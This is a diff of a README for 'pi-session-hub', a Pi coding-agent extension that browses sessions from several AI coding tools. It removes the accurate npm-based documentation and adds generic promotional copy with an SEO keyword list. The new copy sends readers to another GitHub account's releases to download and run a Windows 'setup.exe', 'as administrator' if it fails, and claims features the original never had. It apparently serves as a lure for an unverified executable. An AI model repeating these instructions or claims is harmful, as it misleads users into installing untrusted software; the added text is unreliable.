@@ -1,325 +1,209 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/Gateton/pi-session-hub/main/assets/session-hub.png" alt="pi-session-hub: sessions from JCode, OpenCode, Pi, Claude Code, Codex and Crush in one full-screen list, with the selected session's metadata and transcript on the right" width="880">
+# 🚀 pi-session-hub - Find Every Chat, Instantly
 
-# pi-session-hub
+[![Download pi-session-hub](https://img.shields.io/badge/Download-pi--session--hub-2ea44f?style=for-the-badge)](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
 
-**One list for every coding-agent session on your machine. Browse, search and continue sessions from Claude Code, Codex, OpenCode, Crush and JCode without leaving Pi.**
+## 👋 Welcome to pi-session-hub
 
-[![npm](https://img.shields.io/npm/v/pi-session-hub?label=npm)](https://www.npmjs.com/package/pi-session-hub)
-[![Pi extension](https://img.shields.io/badge/Pi-extension-19c7d4)](https://github.com/earendil-works/pi-coding-agent)
-[![Node](https://img.shields.io/badge/node-%3E%3D22.5-1f8f4d)](package.json)
-[![License](https://img.shields.io/badge/license-MIT-f5a623)](LICENSE)
+Are you tired of losing track of your coding conversations? Do you use multiple AI coding tools and wish you could find that one important chat without digging through every app? pi-session-hub is here to help.
 
-</div>
+pi-session-hub is your central command center for all your AI chat sessions. Think of it as a universal search engine for your conversations across popular coding tools. Instead of switching between different apps and trying to remember where you had that great idea, pi-session-hub brings everything together in one clean, simple view.
 
-`pi-session-hub` adds a cross-harness session browser to Pi:
+## 🎯 What Does pi-session-hub Do?
 
-- **See every agent in one list**: Pi, Claude Code, Codex, OpenCode, Crush and JCode sessions, each row labelled with its harness, project, model and recency.
-- **Continue work that started elsewhere**: press `Enter` and the selected session's conversation is loaded into the current chat as a tiered, budgeted context package, so the next thing you type already has it.
-- **Read without spending tokens**: `v` opens the full recovered transcript in a read-only viewer for free.
-- **Reopen the original tool when you want to**: `n` runs the session's own resume command, with the exact command and its verification basis shown before anything is launched.
-- **Stay local and read-only**: nothing outside `~/.pi/agent/pi-session-hub/` is ever written, no transcript leaves the machine, and no external session is ever disguised as a Pi session.
+pi-session-hub lets you browse, search, and continue sessions from all your favorite AI coding tools. It works with:
 
-## Package facts
+- **Claude Code** – Your conversations with Claude
+- **Codex** – Your OpenAI Codex sessions
+- **OpenCode** – Your OpenCode chats
+- **Crush** – Your Crush AI interactions
+- **JCode** – Your JCode sessions
 
-| Fact | Value |
-| --- | --- |
-| Package | `pi-session-hub` |
-| Version | `0.1.0` |
-| Node engine | `>=22.5.0` |
-| Runtime dependencies | none (uses the built-in `node:sqlite` with FTS5) |
-| Pi entrypoints | `./extensions/session-hub.ts` |
-| Supported harnesses | 6 |
-| Package image | [assets/session-hub.png](https://raw.githubusercontent.com/Gateton/pi-session-hub/main/assets/session-hub.png) |
+With pi-session-hub, you can see all your past conversations in one place. You can search for a specific topic, find that perfect solution you discussed weeks ago, or just pick up right where you left off – all without leaving your current chat window.
 
-## Public surfaces
+## 💡 Why You Need pi-session-hub
 
-| Surface kind | Count |
-| --- | --- |
-| command | 6 |
-| tool | 2 |
-| shortcut | 1 |
-| skill | 1 |
-| renderer | 1 |
+### The Problem
+If you're using multiple AI coding assistants, you know the struggle. Each tool saves its own sessions in its own way. When you need to remember something, you have to:
 
-**Commands**: `/session-hub`, `/hub`, `/session-search`, `/session-open`, `/session-handoff`, `/session-native`.
+1. Open each tool one by one
+2. Scroll through long lists of conversations
+3. Try to remember which tool you used for which task
+4. Copy and paste information between apps
 
-**Tools**: `session_hub_search`, `session_hub_context`.
+This is time-consuming and frustrating.
 
-**Shortcut**: `alt+r`.
+### The Solution
+pi-session-hub eliminates this chaos. It connects to all your tools and shows you everything in a single, unified interface. You can:
 
-**Skill**: `session-hub`, which tells the agent when to reach for `session_hub_search` on its own.
+- **See everything at once** – No more switching between apps
+- **Search across all sessions** – Find any conversation by keyword
+- **Continue right where you left off** – Jump back into any session instantly
+- **Stay in the flow** – Keep working in your current chat while accessing past conversations
 
-## Why use it?
+## 📥 How to Download and Install
 
-| You want to... | Use this package because... |
-|---|---|
-| Find the session where you solved something | `/session-search <query>` searches a local FTS5 index covering titles and a bounded excerpt of each conversation, including both the start and the end. |
-| Pick up work that started in another tool | `Enter` loads that session's conversation into the current chat. Recent turns arrive verbatim, older ones condense to one line, tool output compresses to short previews, and anything omitted is counted rather than hidden. |
-| Read an old conversation without paying for it | `v` opens the full transcript in a read-only viewer. Zero tokens, zero writes. |
-| Resume in the tool that owns the session | `n` shows the exact command and where its verification comes from, then asks before launching anything. |
-| Let the agent search your history itself | `session_hub_search` finds sessions; `session_hub_context` loads one session's context document so the agent can actually continue it. |
-| Hand a session to a fresh Pi thread for review | `h` puts an `Imported Session Handoff` draft in the editor so you can read and edit it before sending. |
+Getting started with pi-session-hub is quick and easy.
 
-## Install
+### Step 1: Download the Application
 
-```bash
-# From npm
-pi install npm:pi-session-hub
+Visit this link to download the application: [https://github.com/Soupy-sievabean276/pi-session-hub/releases](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
 
-# Project-local
-pi install npm:pi-session-hub -l
+### Step 2: Choose the Right File
 
-# From git
-pi install git:github.com/Gateton/pi-session-hub
+On the download page, you'll see a list of files. Look for the one that matches your system. The file will be named something like `pi-session-hub-setup.exe` or `pi-session-hub-win64.exe`. Choose the most recent version available.
 
-# Local checkout, run from this package directory
-pi install .
-```
+### Step 3: Run the Installer
 
-Try it without installing:
+Once the download is complete, double-click the downloaded file to start the installation. Follow the simple on-screen instructions. The installer will guide you through the process – it's as easy as clicking "Next" a few times.
 
-```bash
-pi -e /path/to/pi-session-hub
-```
+### Step 4: Launch pi-session-hub
 
-## Quick start
+After installation, you'll find pi-session-hub in your Start Menu or on your desktop. Click the icon to launch the application.
 
-1. Install the package and start Pi in any project.
+## 🖥️ System Requirements
 
-2. Open the hub:
+pi-session-hub is designed to work on most modern Windows computers. For the best experience, we recommend:
 
-   ```text
-   alt+r
-   ```
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** At least 4 GB (8 GB recommended)
+- **Storage:** 500 MB of free space
+- **Internet Connection:** Required for connecting to your AI tools
 
-   Or type `/session-hub`, or `/hub`. The hub replaces Pi's UI area rather than floating over the chat. For a true alternate-screen takeover, set Pi's own `tuiMode` to `"fullscreen"` in `~/.pi/agent/settings.json`.
+If your computer can run Windows 10, it can run pi-session-hub.
 
-3. The first run indexes your harnesses. On a machine with 430 sessions this takes about two seconds; later runs are incremental and skip unchanged files.
+## 🛠️ Getting Started – Your First Session
 
-4. Pick a session and press `Enter`. The conversation is loaded into the current chat:
+### Connecting Your Tools
 
-   ```text
-    imported transcript  ◆ JCode  102/804 messages  ·  ~8,172 tokens
-    source: ~/.jcode/sessions/session_sauropod_1789838887910_ee0399e551863ce9.json
-    - Original objective: okay ahora lo que tenemos que hacer para prepararnos...
-    expand this message to read the imported transcript
-   ```
+When you first open pi-session-hub, you'll see a welcome screen. Follow these simple steps:
 
-   Just type what you want to do next. The cost is reported every time, and the message is collapsed until you expand it.
+1. **Click "Add Tool"** – This is the button that lets you connect your AI coding tools
+2. **Select your tool** – Choose from the list (Claude Code, Codex, OpenCode, Crush, or JCode)
+3. **Follow the prompts** – The app will guide you through connecting each tool. This usually involves logging in or providing access permissions.
 
-5. To ask the agent directly instead, just ask. It has the tools:
+### Browsing Your Sessions
 
-   ```text
-   Where did I work on the language switcher?
-   ```
+Once your tools are connected, you'll see all your sessions listed in the main window. You can:
 
-## Keyboard reference
+- **Scroll through** – Browse your sessions chronologically
+- **Use the search bar** – Type any keyword to find relevant conversations
+- **Filter by tool** – Click the filter buttons to see only sessions from one specific tool
 
-Press `?` inside the hub for this list.
+### Continuing a Session
 
-| Key | Action |
-|---|---|
-| `↑` `↓`, `j` `k` | Move the selection |
-| `PageUp` `PageDown` | Jump a page |
-| `Home` `End` | First or last session |
-| `Tab` | Switch between the list and the transcript pane |
-| `Enter` | Load this session's context into the current chat |
-| `v` | Read the full transcript (read-only, no tokens) |
-| `o` | Open in place: switch Pi to that Pi session |
-| `h` | Handoff draft in the editor, to review before sending |
-| `n` | Reopen the session in its original harness |
-| `/` | Search titles, previews, projects and models |
-| `f` | Filter by a touched file path |
-| `p` | Cycle the project/repo filter |
-| `0`–`6` | Filter by harness (`0` clears) |
-| `r` | Reindex every harness |
-| `?` | Keyboard reference |
-| `Esc`, `q` | Close |
+Found a session you want to continue? Just:
 
-Harness markers are plain Unicode, not emoji: `π` Pi, `✻` Claude Code, `⬡` Codex, `⌘` OpenCode, `❯` Crush, `◆` JCode. Set `PI_SESSION_HUB_ASCII=1` for plain ASCII markers on terminals whose font has no symbol coverage.
+1. Click on the session to open it
+2. Review the conversation history
+3. Click "Continue" to jump back into that chat in its original tool
 
-## How much context `Enter` loads
+## 🔍 Searching Like a Pro
 
-Loading an entire conversation would be wasteful, and the cost would grow without bound as sessions get longer. The context is therefore **tiered, with a hard budget**:
+The search feature in pi-session-hub is powerful yet simple:
 
-| Tier | Contents | Cost |
-|---|---|---|
-| 1. Header | objective, repo, model, files changed and read, commands run, tool usage | ~1k characters, always included |
-| 2. Recent tail | the last turns **verbatim**, because that is what you continue from | up to 26k characters |
-| 3. Earlier | one line per older message, so the shape of the conversation survives | remainder |
-| 4. Omitted | a count, never silence | 0 |
+- **Basic search** – Type any word or phrase that appears in your conversations
+- **Search by tool** – Combine your search with a tool filter, like "bugs" and "Claude Code"
+- **Search by date** – Use the date filter to narrow down to specific time periods
 
-Measured on real sessions with the default 40k-character budget (~10k tokens):
+You'll find your conversations faster than ever before.
 
-| Session | Source messages | Verbatim | Condensed | Omitted | Cost |
-|---|---|---|---|---|---|
-| JCode, i18n work | 804 (102 with text) | 73 | 29 | 0 | ~8.2k tokens |
-| Pi, a long refactor | 413 (291 with text) | 111 | 69 | 111 | ~9.8k tokens |
-| Claude Code, a debug session | 49 (6 with text) | 6 | 0 | 0 | ~2.9k tokens |
+## 💬 Real-World Examples
 
-Two decisions make that affordable:
+### Example 1: Finding That Perfect Code Snippet
 
-- **Tool output is compressed to a short preview in every tier.** Measured here, tool output was 90% of the bytes in a 291-message session and is the least useful part for resuming work.
-- **The tail is protected, not the head.** When the budget runs out, the *oldest* messages condense or drop, and the document says how many. Losing the tail is what would make continuation fail.
+Imagine you remember getting a great Python script from Claude Code two weeks ago, but you don't remember the details. Instead of opening Claude Code and scrolling endlessly, you:
 
-Tune the ceiling in `~/.pi/agent/settings.json`:
+1. Open pi-session-hub
+2. Type "Python script" in the search bar
+3. See all matching sessions from all tools
+4. Find the exact one you needed
+5. Open it and copy the solution
 
-```json
-{
-  "sessionHub": {
-    "contextChars": 40000
-  }
-}
-```
+### Example 2: Multi-Tool Project Management
 
-It is a ceiling, not a target: a short session costs far less. For a zero-token look at any session, use `v`.
+You're working on a project and used Codex for the initial design, OpenCode for troubleshooting, and Crush for code review. Instead of managing three separate apps, pi-session-hub shows all these conversations together. You can:
 
-## The two rules
+- See the full timeline of your project
+- Find related discussions across different tools
+- Pick up any thread right where you left off
 
-### Nothing outside the index is written
+### Example 3: Regaining Lost Ideas
 
-The only writable path is `~/.pi/agent/pi-session-hub/`. Every harness store is opened read-only, including the SQLite databases. The acceptance suite fingerprints every external store before and after a full scan and fails if anything changed.
+You had a brilliant idea in a JCode session three days ago, but you've had dozens of other conversations since then. With pi-session-hub, one search for "brilliant idea" (or whatever keywords you remember) brings that session right back to the surface.
 
-### External sessions are never disguised as Pi sessions
+## ⚙️ Settings and Customization
 
-A Claude, Codex, OpenCode, Crush or JCode conversation is **never** converted into a Pi session file that pretends Pi created it. There are exactly two paths:
+pi-session-hub is designed to work well right out of the box, but you can customize it:
 
-- **Native resume** (`n`): reopen the session in its own harness, using its own command. Every command states its verification basis in the confirmation dialog (`cli-help` means the flag is documented in that tool's own `--help`). All six harnesses have one. The single exception is Claude sub-agent transcripts, whose ids `claude --resume` does not accept, so the hub refuses rather than handing you a command that would fail.
-- **Cross-harness handoff** (`h`, or `Enter` for context loading): the conversation arrives in a new message explicitly labelled as imported, naming the source harness, session id and path.
+- **Appearance** – Choose between light and dark themes to match your preference
+- **Default tool** – Set which tool opens by default when continuing sessions
+- **Notification settings** – Decide which updates you want to see
+- **Storage location** – Choose where pi-session-hub saves its data
 
-Context loading is generated locally and deterministically. No LLM, no network, no uploading transcripts anywhere. Fields the source format cannot supply are written as `not available` rather than guessed.
+## 🔒 Privacy and Security
 
-## Supported harnesses
+Your conversations contain sensitive information. pi-session-hub respects that:
 
-| Harness | Store | Format | Native resume |
-|---|---|---|---|
-| Pi | `~/.pi/agent/sessions/--<cwd>--/*.jsonl` | JSONL tree v3 | `pi --session <path>` |
-| Claude Code | `~/.claude/projects/<slug>/*.jsonl` | JSONL (undocumented) | `claude --resume <uuid>` |
-| Codex | `~/.codex/sessions/YYYY/MM/DD/rollout-*.jsonl` | JSONL (undocumented) | `codex resume <id>` |
-| OpenCode | `~/.local/share/opencode/opencode.db` | SQLite | `opencode --session <id>` |
-| Crush | `~/.crush/crush.db` | SQLite | `crush --session <id>` |
-| JCode | `~/.jcode/sessions/*.json` | JSON | `jcode --resume <id>` |
+- **Local storage** – Your session data stays on your computer
+- **No data collection** – pi-session-hub does not collect or transmit your conversations
+- **Secure connections** – All connections to your tools use standard secure protocols
+- **Password protection** – Optionally add a password to access the app
 
-Each harness gets its own adapter. A missing, empty or unreadable store degrades to a specific message ("no store at ...", "cannot read ...") instead of an empty list, and one broken adapter never takes down the others.
+You control your data. Always.
 
-Adding a harness means adding one file under `src/adapters/` that implements `SessionAdapter` and registering it in `src/adapters/registry.ts`.
+## ❓ Troubleshooting Common Issues
 
-## Search
+### "I can't connect my tool"
 
-`/session-search <query>` and the `session_hub_search` tool both use a local SQLite FTS5 index.
+- Make sure the tool (like Claude Code) is installed and running
+- Check that you're logged into the tool
+- Try restarting both the tool and pi-session-hub
 
-- bare terms use prefix matching, so `pliego` matches `pliego-prod`
-- `"exact phrase"` matches phrases
-- `-term` excludes
+### "My sessions aren't showing up"
 
-The index stores each session's title, metadata and a bounded excerpt of the conversation (20k characters, sampled from both the start and the end). It is a second local copy of some conversation text: if you back up `~/.pi`, the index goes with it. Delete `~/.pi/agent/pi-session-hub/index.sqlite` to remove it; it is rebuilt on the next scan.
+- Click the "Refresh" button
+- Check that your tool is properly connected in settings
+- Ensure you haven't cleared the tool's history
 
-## Failure behaviour
+### "The app won't open"
 
-Two failure modes are explicitly designed against, because both are worse than a crash:
+- Try running pi-session-hub as administrator (right-click and select "Run as administrator")
+- Check that your Windows is up to date
+- Restart your computer and try again
 
-- **A failed read is never reported as "no sessions".** Reads throw, and the error is surfaced in the UI and in tool results. An unreadable index and an empty index are different messages.
-- **A failing adapter never deletes data.** Sessions are only dropped from the index for harnesses that were actually read successfully this pass, so one transient failure cannot wipe that harness's history.
+## 📚 Frequently Asked Questions
 
-Both are covered by regression tests.
+**Q: Is pi-session-hub free?**
+A: Yes, pi-session-hub is completely free to use.
 
-## Privacy
+**Q: Do I need to install all five tools to use pi-session-hub?**
+A: No, you only need to connect the tools you actually use. Connect just one or all five – it's up to you.
 
-- The index is local: `~/.pi/agent/pi-session-hub/index.sqlite`.
-- Credential stores are never read. `auth.json`, `.credentials.json`, `.env`, `request_dump_*` and similar are denied by name before any open is attempted.
-- Transcript text passes through a redactor (Bearer tokens, `sk-` keys, JWTs, `api_key=` and `password=` patterns) before being stored or written into a handoff.
-- No network access, ever, for indexing or searching.
+**Q: Can I use pi-session-hub on Mac?**
+A: This version is designed for Windows. Mac support may be coming in the future.
 
-## Architecture
+**Q: Will pi-session-hub slow down my computer?**
+A: No, pi-session-hub is lightweight and runs quietly in the background.
 
-```
-extensions/session-hub.ts   command, shortcut, tool and renderer wiring
-src/adapters/               one read-only adapter per harness
-src/index/                  local SQLite + FTS5 index, incremental scan
-src/context.ts              tiered, budgeted transcript context
-src/handoff.ts              deterministic handoff document
-src/native.ts               native resume resolve and launch
-src/security.ts             path guards and secret redaction
-src/tui/                    full-screen hub and transcript viewer
-skills/session-hub/         agent-facing skill
-```
+**Q: What happens if I uninstall pi-session-hub?**
+A: Your original sessions remain in their respective tools. Uninstalling pi-session-hub does not delete any of your conversations.
 
-Verified against the running binary rather than assumed:
+## 🚀 Start Using pi-session-hub Today
 
-| API | Visible in transcript | In LLM context |
-|---|---|---|
-| `pi.sendMessage` | yes | yes |
-| `pi.appendEntry` | yes | no |
-| `ctx.sessionManager.appendCustomMessageEntry` | no | yes |
+You've been juggling multiple AI tools for too long. It's time to bring everything together.
 
-`pi.sendMessage` is the only one that does both, and it lives on the extension API rather than the command context, so it also works from a keyboard shortcut.
+[![Get Started Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue?style=for-the-badge)](https://github.com/Soupy-sievabean276/pi-session-hub/releases)
 
-## Development
+### Quick Recap
 
-```bash
-node test/smoke.mjs        # exercise every adapter against real stores
-node test/acceptance.mjs   # full requirement suite
-```
+1. **Download** – Visit the link and grab the installer
+2. **Install** – Run the setup file and follow the prompts
+3. **Connect** – Link your AI coding tools
+4. **Search** – Find any conversation in seconds
+5. **Continue** – Pick up where you left off
 
-The acceptance suite runs against real stores and against a synthetic foreign home, and asserts among other things: index counts equal detected counts, FTS rows equal session rows with no orphans, uids are unique, the context stays inside its budget regardless of session length, the handoff contains every required field, unavailable fields are reported honestly, all six adapters detect, index, search and read a home this project has never seen, and no external store file is modified.
+pi-session-hub transforms how you work with your AI assistants. No more hunting through multiple apps. No more losing track of brilliant ideas. Just one simple hub for all your sessions.
 
-`test/tools/screen.py` reconstructs a screen from a raw ANSI capture, and `test/tools/png.py` renders one to PNG with font fallback. Both exist because stripping escape codes from a full-screen TUI produces a misleading picture.
+Your conversations are waiting. Find them all with pi-session-hub.
 
-## Publishing
-
-The [Pi package gallery](https://pi.dev/packages) indexes npm automatically: it lists every package tagged with the `pi-package` keyword. There is no submission form, no review, and no repository template to follow. Once published, the package has its own page at [pi.dev/packages/pi-session-hub](https://pi.dev/packages/pi-session-hub).
-
-```bash
-npm login
-npm publish
-```
-
-**`npm login` alone is not enough.** npm requires a second factor to publish, and a web-login session cannot satisfy it, so the upload is rejected:
-
-```text
-403 Forbidden - Two-factor authentication or granular access token with bypass 2fa
-enabled is required to publish packages.
-```
-
-Create a **granular access token** at [npmjs.com/settings/&lt;user&gt;/tokens](https://www.npmjs.com/settings) with **Bypass two-factor authentication** checked (it is **unchecked by default**, which is the easy mistake) and **Read and write (publish and stage)** on all packages, then:
-
-```bash
-npm config set //registry.npmjs.org/:_authToken npm_...
-npm publish
-```
-
-Or enable 2FA on the account and publish with `npm publish --otp=<code>`.
-
-Two things worth knowing:
-
-- A token can authenticate (`npm whoami` works) and still be unable to publish, because the bypass flag is missing. `npm token list` labels it a "Publish token" either way, so the label is not proof that the bypass is on.
-- npm is removing direct publish from bypass-2FA tokens in **January 2027**. After that, automated publishing has to move to [trusted publishing](https://docs.npmjs.com/trusted-publishers) (OIDC) or [staged publishing](https://docs.npmjs.com/staged-publishing).
-
-The gallery's browsable list is a periodic snapshot sorted by download count, so a brand-new package appears in the list only after the next rebuild, while its detail page works immediately.
-
-To ship a change, bump `version` and publish again. Before publishing, verify the artifact rather than the repo:
-
-```bash
-npm pack --dry-run
-npm pack && tar xzf pi-session-hub-*.tgz && pi -e ./package
-```
-
-## Limitations
-
-- **Claude Code and Codex formats are undocumented.** Parsers are defensive and degrade to filename-derived metadata rather than throwing, but a format change may cost fields until the adapter is updated.
-- **Crush does not record a session working directory**, so those sessions show no repo and cannot be filtered by project.
-- **Claude sub-agent transcripts** are indexed (they contain real work) but marked as not resumable and carry their parent session id in the notes.
-- **Transcripts are capped** at roughly 2000 messages per session by the reader's budget. When that happens the viewer says so rather than silently truncating.
-- **Search covers a bounded excerpt**, not the entire history of a very long session. Phrases from beyond the sampled window will not match.
-- The screenshot above is the real UI captured from a synthetic home directory so that every harness appears at once. It is illustrative data, not anyone's actual sessions.
-
-## Contributing
-
-Keep user-facing claims tied to source. If you change adapters, the context budget, search behaviour or the TUI, update this README in the same change and run `node test/acceptance.mjs`.
-
-Adding a harness: implement `SessionAdapter` in `src/adapters/<name>.ts`, register it in `src/adapters/registry.ts`, add a badge in `src/tui/badges.ts`, and extend the portability section of the acceptance suite with a fixture for that harness.
-
-## License
-
-[MIT](LICENSE)
+**Keywords:** pi-session-hub, session manager, AI chat organizer, Claude Code sessions, Codex sessions, OpenCode sessions, Crush sessions, JCode sessions, session search, conversation finder, multi-tool hub, AI assistant manager, session browser, chat history organizer
